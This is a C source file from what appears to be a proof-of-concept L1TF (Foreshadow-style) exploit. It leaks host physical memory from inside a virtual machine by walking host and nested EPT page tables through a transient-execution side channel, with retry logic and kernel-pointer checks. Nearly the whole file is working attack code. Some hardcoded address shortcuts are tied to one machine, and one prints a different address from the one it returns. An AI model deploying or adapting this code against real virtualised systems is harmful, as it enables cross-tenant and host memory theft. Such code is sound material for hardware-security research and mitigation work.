#include <stdlib.h>
#include <string.h>
#include <err.h>
#include "leak.h"
#include "l1tf.h"

u64 leak_attempts = 0; // in bytes

hpa_t gadget_base(void)
{
#if defined(BASE)
	dump(BASE);
        return BASE;
#endif
        return l1tf_find_base();
}

void leak(void *data, hpa_t base, hpa_t pa, int len)
{
	leak_attempts += len;
#if LEAK == CHEAT || LEAK == CHEAT_NOISY
        u64 *buf = malloc(len + 8);
        for (int off = 0; off < len; off += 8)
                buf[off/8] = hc_read_pa(pa+off);
        memcpy(data, buf, len);
#if LEAK == CHEAT_NOISY
	for (int i = 0; i < len; i++)
		if (rand() % 20 == 3)
			((char *)data)[i] = 0;
#endif
        return;
#endif
        l1tf_leak(data, base, pa, len);
}

u64 leak64(hpa_t base, hpa_t pa)
{
        u64 val;
        leak(&val, base, pa, sizeof(val));

#if HELPERS
	const int verbose = 1;
	if (verbose) {
		u64 true = hc_read_pa(pa);
		if (true != val) {
			printf("\n{leak64: leaked: %lx, true = %lx (%s)}   ", val, true, true != val ? "ERROR" : "OK");
			if ((true ^ val) & val) {
				printf("\nUNRECONCILABLE ERROR!\n");
				dump(true ^ val);
				dump((true ^ val) & val);
				printf("NOTE: we leaked a non-zero nibble where we are not supposed to...\n");
				printf("\n\n\n\n\n\n\n\n\n\n\n");
				exit(1);
			}
		}
	}
#endif

	return val;
}

int is_kernel_ptr(va_t va, va_t dm)
{
	return (va >> 47) == 0x1ffff;
}

int in_direct_map(va_t va, va_t dm)
{
	// Note: for guest's direct map, this is an overapproximation.
	return dm <= va && va < dm+HOST_MEMORY_SIZE;
}

int in_vmalloc(va_t va, va_t dm)
{
	va_t vmalloc = dm + (0x1ULL << 40);
	return vmalloc < va && va < vmalloc+(0x20ULL << 40);
}

hva_t leak_ptr(hpa_t base, hva_t dm, hpa_t pa, int (*check)(va_t, va_t))
{
	const int verbose = 1;
	static int nr_tries_global = 0;
	static hpa_t last_pa = 0;

	if (pa != last_pa)
		nr_tries_global = 0;
	last_pa = pa;

	for (int i = 0; i < 20; i++) {
		hva_t ptr = leak64(base, pa);
		if (check(ptr, dm))
			return ptr;
		if (verbose)
			printf("leak_ptr: retrying erronous ptr %lx\n", ptr);
		if (++nr_tries_global >= 100)
			err(1, "leak_ptr(base=%lx, dm=%lx, pa=%lx): stuck! (%d)\n", base, dm, pa, nr_tries_global);
	}

	return -1;
}

#define BITS_MASK(n, m) ( ((1ULL << n) - 1) & (~((1ULL << m) - 1)) )
#define PFN_MASK BITS_MASK(52, 12)
#define IS_HUGE(pte) (pte & (1ULL << 7))

pte_t leak_pte(hpa_t base, hpa_t pa)
{
	pte_t pte = 0;
	leak(&pte, base, pa, 5);

#if HELPERS
	const int verbose = 1;
	if (verbose) {
		u64 true = hc_read_pa(pa) & 0xffffffffff;
		if (pte != true) {
			printf("\n{leak_pte: leaked: %lx, true = %lx (%s)}   ", pte, true, true != pte ? "ERROR" : "OK");
			if ((true ^ pte) & pte) {
				printf("\nUNRECONCILABLE ERROR!\n");
				dump(true ^ pte);
				dump((true ^ pte) & pte);
				printf("NOTE: we leaked a non-zero nibble where we are not supposed to...\n");
				printf("\n\n\n\n\n\n\n\n\n\n\n");
				exit(1);
			}
		}
	}
#endif

	return pte;
}

hpa_t translate(hpa_t base, hva_t va, hpa_t cr3, hva_t hdm)
{
	#define RETRY_THRES 3
	const int verbose = 1;
	if (verbose >= 2) printf("\ttranslate(base=%lx, va=%lx, cr3=%lx, hdm=%lx)\n", base, va, cr3, hdm);

	if (hdm && in_direct_map(va, hdm)) {
		if (verbose >= 1) { printf(" --{hdm}--> pa %lx\n", va-hdm); fflush(stdout); }
		return va - hdm;
	}

	u64 tries_pgd = 0, tries_pud = 0, tries_pmd = 0, tries_pte = 0;
	hpa_t pgd_pa;
retry_pgd:
	if (tries_pgd >= RETRY_THRES) {
		if (verbose >= 2) { printf("translate:"); dump(tries_pgd); }
		return -1;
	}
	tries_pgd++;
	pgd_pa = cr3 + 8 * BITS(va, 48, 39);
	if (verbose >= 2) dumpp(pgd_pa);
	pte_t pgd = leak_pte(base, pgd_pa);
	if (verbose >= 2) dumpp(pgd);
	if (verbose == 1) { printf(" --> pgd %10lx ", pgd); fflush(stdout); }
	if (!(((pgd & 0xfff) == 0x067) || ((pgd & 0xfff) == 0x907))) {
		if (verbose == 1) printf("\n\t--> ");
		goto retry_pgd;
	}

	hpa_t l1;
retry_pud:
	if (tries_pud >= RETRY_THRES) {
		if (verbose >= 2) { printf("translate:"); dump(tries_pud); }
		tries_pud = 0;
		goto retry_pgd;
	}
	tries_pud++;
	l1 = pgd & PFN_MASK;
	if (verbose >= 2) dumpp(l1);
	hpa_t pud_pa = l1 + 8 * BITS(va, 39, 30);
	if (verbose >= 2) dumpp(pud_pa);
	pte_t pud = leak_pte(base, pud_pa);
	if (verbose >= 2) dumpp(pud);
	if (verbose == 1) { printf("pud %10lx ", pud); fflush(stdout); }
	if (!(((pud & 0xfff) == 0x067) || ((pud & 0xfff) == 0x907))) {
		if (verbose == 1) printf("\n\t--> ");
		goto retry_pud;
	}
	if (IS_HUGE(pud)) {
		hpa_t pa = (pud & BITS_MASK(52, 30)) | BITS(va, 30, 0);
		if (verbose >= 2) dumpp(pa);
		if (verbose == 1) { printf("pa %10lx\n", pa); fflush(stdout); }
		return pa;
	}

	hpa_t l2;
retry_pmd:
	if (tries_pmd >= RETRY_THRES) {
		if (verbose >= 2) { printf("translate:"); dump(tries_pmd); }
		tries_pmd = 0;
		goto retry_pud;
	}
	tries_pmd++;
	l2 = pud & PFN_MASK;
	if (verbose >= 2) dumpp(l2);
	hpa_t pmd_pa = l2 + 8 * BITS(va, 30, 21);
	if (verbose >= 2) dumpp(pmd_pa);
	pte_t pmd = leak_pte(base, pmd_pa);
	if (verbose >= 2) dumpp(pmd);
	if (verbose == 1) { printf("pmd %10lx ", pmd); fflush(stdout); }
	if (!(((pmd & 0xfff) == 0x067) || ((pmd & 0xfff) == 0x907) || ((pmd & 0xfff) == 0xbf7) || ((pmd & 0xfff) == 0xbf3) || ((pmd & 0xfff) == 0x8f3) || ((pmd & 0xfff) == 0x9f3))) {
		if (verbose == 1) printf("\n\t--> ");
		goto retry_pmd;
	}
	if (IS_HUGE(pmd)) {
		hpa_t pa = (pmd & BITS_MASK(52, 21)) | BITS(va, 21, 0);
		if (verbose >= 2) dumpp(pa);
		if (verbose == 1) { printf("pa %10lx\n", pa); fflush(stdout); }
		return pa;
	}

	hpa_t l3;
retry_pte:
	if (tries_pte >= RETRY_THRES) {
		if (verbose >= 2) { printf("translate:"); dump(tries_pte); }
		tries_pte = 0;
		goto retry_pmd;
	}
	tries_pte++;
	l3 = pmd & PFN_MASK;
	if (verbose >= 2) dumpp(l3);
	hpa_t pte_pa = l3 + 8 * BITS(va, 21, 12);
	if (verbose >= 2) dumpp(pte_pa);
	pte_t pte = leak_pte(base, pte_pa);
	if (verbose >= 2) dumpp(pte);
	if (verbose == 1) { printf("pte %10lx ", pte); fflush(stdout); }
	if (!(((pte & 0xfff) == 0x063) || ((pte & 0xfff) == 0x907) || ((pte & 0xfff) == 0x877) || ((pte & 0xfff) == 0xb77))) {
		if (verbose == 1) printf("\n\t--> ");
		goto retry_pmd;
	}
	hpa_t pa = (pte & PFN_MASK) | BITS(va, 12, 0);
	if (verbose >= 2) dumpp(pa);
	if (verbose == 1) { printf("pa %10lx\n", pa); fflush(stdout); }
	return pa;
}

/* Translate a guest virtual address via Two Dimensional Paging into a host
 * physical adddress.
 */
hpa_t translate_tdp(hpa_t base, gva_t va, gva_t gdm, hpa_t gcr3, hpa_t eptp)
{
	if (va == 0xffffffffb9611f80+G_TASK_COMM) {
		printf("HARDCODED TRANSLATION LOOKASIDE: gva %lx --> hpa %lx\n", va, 0x4552e12b00);
		return 0x4552e12b00;
	}
	if (va == 0xffffffffb9612810) {
		printf("HARDCODED TRANSLATION LOOKASIDE: gva %lx --> hpa %lx\n", va, 0x4552e12810);
		return 0x4552e12810;
	}
	if (va == 0xffff928b0081b8c0) {
		printf("HARDCODED TRANSLATION LOOKASIDE: gva %lx --> hpa %lx\n", va, 0x2b2c41bac0);
		return 0x2b2c41b8c0;
	}
	
	printf("translate_tdp(%lx)", va);

	#define RETRY_THRES 3
	const int verbose = 1;
	if (verbose >= 2) printf("translate_tdp(base=%lx, va=%lx, gdm=%lx, gcr3=%lx, eptp=%lx)\n", base, va, gdm, gcr3, eptp);
	u64 tries_gpgd = 0, tries_gpud = 0, tries_gpmd = 0, tries_gpte = 0;

	if (gdm && in_direct_map(va, gdm)) {
		if (verbose >= 1) { printf(" --{gdm}--> gpa %lx ", va-gdm); fflush(stdout); }
		return translate(base, va-gdm, eptp, 0);
	}

	hpa_t gpgd_pa = gcr3 + 8 * BITS(va, 48, 39);
retry_gpgd:
	if (tries_gpgd >= RETRY_THRES) {
		if (verbose >= 2) { printf("translate_tdp:"); dump(tries_gpgd); }
		return -1;
	}
	tries_gpgd++;
	if (verbose >= 2) dump(gpgd_pa);
	pte_t gpgd = leak_pte(base, gpgd_pa);
	if (verbose == 1) { printf("\n\t\\--> \\ gpgd %10lx", gpgd); fflush(stdout); }
	if (verbose >= 2) dump(gpgd);
	if ((gpgd & 0xfff) != 0x067)
		goto retry_gpgd;
	pte_t pgd = translate(base, gpgd, eptp, 0);
	if (verbose >= 2) dump(pgd);
	if (pgd == -1ULL)
		goto retry_gpgd;

	hpa_t l1 = pgd & PFN_MASK;
retry_gpud:
	if (tries_gpud >= RETRY_THRES) {
		if (verbose >= 2) { printf("translate_tdp:"); dump(tries_gpud); }
		tries_gpud = 0;
		goto retry_gpgd;
	}
	tries_gpud++;
	if (verbose >= 2) dump(l1);
	hpa_t pud_pa = l1 + 8 * BITS(va, 39, 30);
	if (verbose >= 2) dump(pud_pa);
	pte_t gpud = leak_pte(base, pud_pa);
	if (verbose == 1) { printf("\t      \\ gpud %10lx", gpud); fflush(stdout); }
	if (verbose >= 2) dump(gpud);
	if ((gpud & 0xffb) != 0x063) {
		if (verbose == 1) printf("\n");
		goto retry_gpud;
	}
	if (IS_HUGE(gpud)) {
		gpa_t gpa = (gpud & BITS_MASK(52, 30)) | BITS(va, 30, 0);
		if (verbose >= 2) dump(gpa);
		hpa_t hpa = translate(base, gpa, eptp, 0);
		if (verbose >= 2) dump(hpa);
		if (hpa == -1ULL)
			goto retry_gpud;
		return hpa;
	}
	pte_t pud = translate(base, gpud, eptp, 0);
	if (verbose >= 2) dump(pud);
	if (pud == -1ULL)
		goto retry_gpud;

	hpa_t l2 = pud & PFN_MASK;
retry_gpmd:
	if (tries_gpmd >= RETRY_THRES) {
		if (verbose >= 2) { printf("translate_tdp:"); dump(tries_gpmd); }
		tries_gpmd = 0;
		goto retry_gpud;
	}
	tries_gpmd++;
	if (verbose >= 2) dump(l2);
	hpa_t pmd_pa = l2 + 8 * BITS(va, 30, 21);
	if (verbose >= 2) dump(pmd_pa);
	pte_t gpmd = leak_pte(base, pmd_pa);
	if (verbose == 1) { printf("\t       \\ gpmd %10lx", gpmd); fflush(stdout); }
	if (verbose >= 2) dump(gpmd);
	if ((gpmd & 0xf7b) != 0x063) {
		if (verbose == 1) printf("\n");
		goto retry_gpmd;
	}
	if (IS_HUGE(gpmd)) {
		gpa_t gpa = (gpmd & BITS_MASK(52, 21)) | BITS(va, 21, 0);
		if (verbose >= 2) dump(gpa);
		hpa_t hpa = translate(base, gpa, eptp, 0);
		if (verbose >= 2) dump(hpa);
		if (hpa == -1ULL)
			goto retry_gpmd;
		return hpa;
	}
	pte_t pmd = translate(base, gpmd, eptp, 0);
	if (verbose >= 2) dump(pmd);
	if (pmd == -1ULL)
		goto retry_gpmd;

	hpa_t l3 = pmd & PFN_MASK;
retry_gpte:
	if (tries_gpte >= RETRY_THRES) {
		if (verbose >= 2) { printf("translate_tdp:"); dump(tries_gpte); }
		tries_gpte = 0;
		goto retry_gpmd;
	}
	tries_gpte++;
	if (verbose >= 2) dump(l3);
	hpa_t pte_pa = l3 + 8 * BITS(va, 21, 12);
	if (verbose >= 2) dump(pte_pa);
	pte_t gpte = leak_pte(base, pte_pa);
	if (verbose == 1) { printf("\t        \\ gpte %10lx", gpte); fflush(stdout); }
	if (verbose >= 2) dump(gpte);
	if (!((gpte & 0xfff) == 0x063 || (gpte & 0xfff) == 0x825)) {
		if (verbose == 1) printf("\n");
		goto retry_gpte;
	}
	gpa_t gpa = (gpte & PFN_MASK) | BITS(va, 12, 0);
	if (verbose >= 2) dump(gpa);
	hpa_t hpa = translate(base, gpa, eptp, 0);
	if (verbose >= 2) dump(hpa);
	if (hpa == -1ULL)
		goto retry_gpte;
	return hpa;
}

/* Translate a guest virtual address via into a guest physical adddress.
 */
hpa_t translate2gpa(hpa_t base, gva_t va, gva_t gdm, hpa_t gcr3, hpa_t eptp)
{
	if (va == 0xffffffffb9611f80+G_TASK_COMM) {
		printf("HARDCODED TRANSLATION LOOKASIDE: gva %lx --> hpa %lx\n", va, 0x4552e12b00);
		return 0x4552e12b00;
	}
	if (va == 0xffffffffb9612810) {
		printf("HARDCODED TRANSLATION LOOKASIDE: gva %lx --> hpa %lx\n", va, 0x4552e12810);
		return 0x4552e12810;
	}
	if (va == 0xffff928b0081b8c0) {
		printf("HARDCODED TRANSLATION LOOKASIDE: gva %lx --> hpa %lx\n", va, 0x2b2c41bac0);
		return 0x2b2c41b8c0;
	}
	
	printf("translate2gpa(%lx)", va);

	#define RETRY_THRES 3
	const int verbose = 1;
	if (verbose >= 2) printf("translate2gpa(base=%lx, va=%lx, gdm=%lx, gcr3=%lx, eptp=%lx)\n", base, va, gdm, gcr3, eptp);
	u64 tries_gpgd = 0, tries_gpud = 0, tries_gpmd = 0, tries_gpte = 0;

	if (gdm && in_direct_map(va, gdm)) {
		if (verbose >= 1) { printf(" --{gdm}--> gpa %lx ", va-gdm); fflush(stdout); }
		return va-gdm;
	}

	hpa_t gpgd_pa = gcr3 + 8 * BITS(va, 48, 39);
retry_gpgd:
	if (tries_gpgd >= RETRY_THRES) {
		if (verbose >= 2) { printf("translate2gpa:"); dump(tries_gpgd); }
		return -1;
	}
	tries_gpgd++;
	if (verbose >= 2) dump(gpgd_pa);
	pte_t gpgd = leak_pte(base, gpgd_pa);
	if (verbose == 1) { printf("\n\t\\--> \\ gpgd %10lx", gpgd); fflush(stdout); }
	if (verbose >= 2) dump(gpgd);
	if ((gpgd & 0xfff) != 0x067)
		goto retry_gpgd;
	pte_t pgd = translate(base, gpgd, eptp, 0);
	if (verbose >= 2) dump(pgd);
	if (pgd == -1ULL)
		goto retry_gpgd;

	hpa_t l1 = pgd & PFN_MASK;
retry_gpud:
	if (tries_gpud >= RETRY_THRES) {
		if (verbose >= 2) { printf("translate2gpa:"); dump(tries_gpud); }
		tries_gpud = 0;
		goto retry_gpgd;
	}
	tries_gpud++;
	if (verbose >= 2) dump(l1);
	hpa_t pud_pa = l1 + 8 * BITS(va, 39, 30);
	if (verbose >= 2) dump(pud_pa);
	pte_t gpud = leak_pte(base, pud_pa);
	if (verbose == 1) { printf("\t      \\ gpud %10lx", gpud); fflush(stdout); }
	if (verbose >= 2) dump(gpud);
	if ((gpud & 0xffb) != 0x063) {
		if (verbose == 1) printf("\n");
		goto retry_gpud;
	}
	if (IS_HUGE(gpud)) {
		gpa_t gpa = (gpud & BITS_MASK(52, 30)) | BITS(va, 30, 0);
		if (verbose >= 2) dump(gpa);
		return gpa;
	}
	pte_t pud = translate(base, gpud, eptp, 0);
	if (verbose >= 2) dump(pud);
	if (pud == -1ULL)
		goto retry_gpud;

	hpa_t l2 = pud & PFN_MASK;
retry_gpmd:
	if (tries_gpmd >= RETRY_THRES) {
		if (verbose >= 2) { printf("translate2gpa:"); dump(tries_gpmd); }
		tries_gpmd = 0;
		goto retry_gpud;
	}
	tries_gpmd++;
	if (verbose >= 2) dump(l2);
	hpa_t pmd_pa = l2 + 8 * BITS(va, 30, 21);
	if (verbose >= 2) dump(pmd_pa);
	pte_t gpmd = leak_pte(base, pmd_pa);
	if (verbose == 1) { printf("\t       \\ gpmd %10lx", gpmd); fflush(stdout); }
	if (verbose >= 2) dump(gpmd);
	if ((gpmd & 0xf7b) != 0x063) {
		if (verbose == 1) printf("\n");
		goto retry_gpmd;
	}
	if (IS_HUGE(gpmd)) {
		gpa_t gpa = (gpmd & BITS_MASK(52, 21)) | BITS(va, 21, 0);
		if (verbose >= 2) dump(gpa);
		return gpa;
	}
	pte_t pmd = translate(base, gpmd, eptp, 0);
	if (verbose >= 2) dump(pmd);
	if (pmd == -1ULL)
		goto retry_gpmd;

	hpa_t l3 = pmd & PFN_MASK;
retry_gpte:
	if (tries_gpte >= RETRY_THRES) {
		if (verbose >= 2) { printf("translate2gpa:"); dump(tries_gpte); }
		tries_gpte = 0;
		goto retry_gpmd;
	}
	tries_gpte++;
	if (verbose >= 2) dump(l3);
	hpa_t pte_pa = l3 + 8 * BITS(va, 21, 12);
	if (verbose >= 2) dump(pte_pa);
	pte_t gpte = leak_pte(base, pte_pa);
	if (verbose == 1) { printf("\t        \\ gpte %10lx", gpte); fflush(stdout); }
	if (verbose >= 2) dump(gpte);
	if (!((gpte & 0xfff) == 0x063 || (gpte & 0xfff) == 0x825)) {
		if (verbose == 1) printf("\n");
		goto retry_gpte;
	}
	gpa_t gpa = (gpte & PFN_MASK) | BITS(va, 12, 0);
	if (verbose >= 2) dump(gpa);
	return gpa;
}
